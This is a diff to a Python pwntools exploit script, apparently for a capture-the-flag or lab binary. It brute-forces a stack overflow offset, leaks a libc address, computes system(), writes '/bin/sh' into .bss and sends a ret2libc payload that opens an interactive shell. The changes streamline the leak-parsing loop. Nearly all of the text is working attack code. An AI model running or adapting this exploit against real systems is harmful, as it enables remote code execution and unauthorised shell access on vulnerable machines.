@@ -32,16 +32,6 @@ except:
 
 rop.main()
 
-recv_check = raw_input('recv str ? (yes or no) : ').rstrip('\n')
-
-if recv_check == 'yes':
-
-	recv_str = raw_input('recv string data : ')
-
-	newline = raw_input('remove newline ? (yes or no) : ').rstrip('\n')
-
-	if newline == 'yes':
-		recv_str = recv_str.rstrip('\n')
 
 while i < 10000:
 
@@ -59,32 +49,28 @@ while i < 10000:
         p.sendline(payload)
 
         try:
-                if recv_check == 'yes':
-                    p.recvuntil(recv_str)
-                    addr = u32(p.recv(4))
-                else:
-                    addr = u32(p.recv(4))
+       		addr = u32(p.recvuntil('\xf7')[-4:])
    
         except:
                 i += 1
+		p.close()
 
         else:
-                if str(hex(addr))[0:4] == '0xf7':
-                        print('addr : ', hex(addr))
-                        base = addr - offset
-                        system = base + libc.symbols['system']
-                        p.send(binsh)
 
-                        payload = ''
-                        payload += 'A'*i
-                        payload += 'B'*4
-                        payload += p32(system)
-                        payload += 'B'*4
-                        payload += p32(bss)
+                print('addr : ', hex(addr))
+                base = addr - offset
+                system = base + libc.symbols['system']
+                p.send(binsh)
 
-                        p.sendline(payload)
+                payload = ''
+                payload += 'A'*i
+                payload += 'B'*4
+                payload += p32(system)
+                payload += 'B'*4
+                payload += p32(bss)
 
-                        p.interactive()
-                        break
-                else:
-                        i += 1
+                p.sendline(payload)
+
+                p.interactive()
+                break
+    
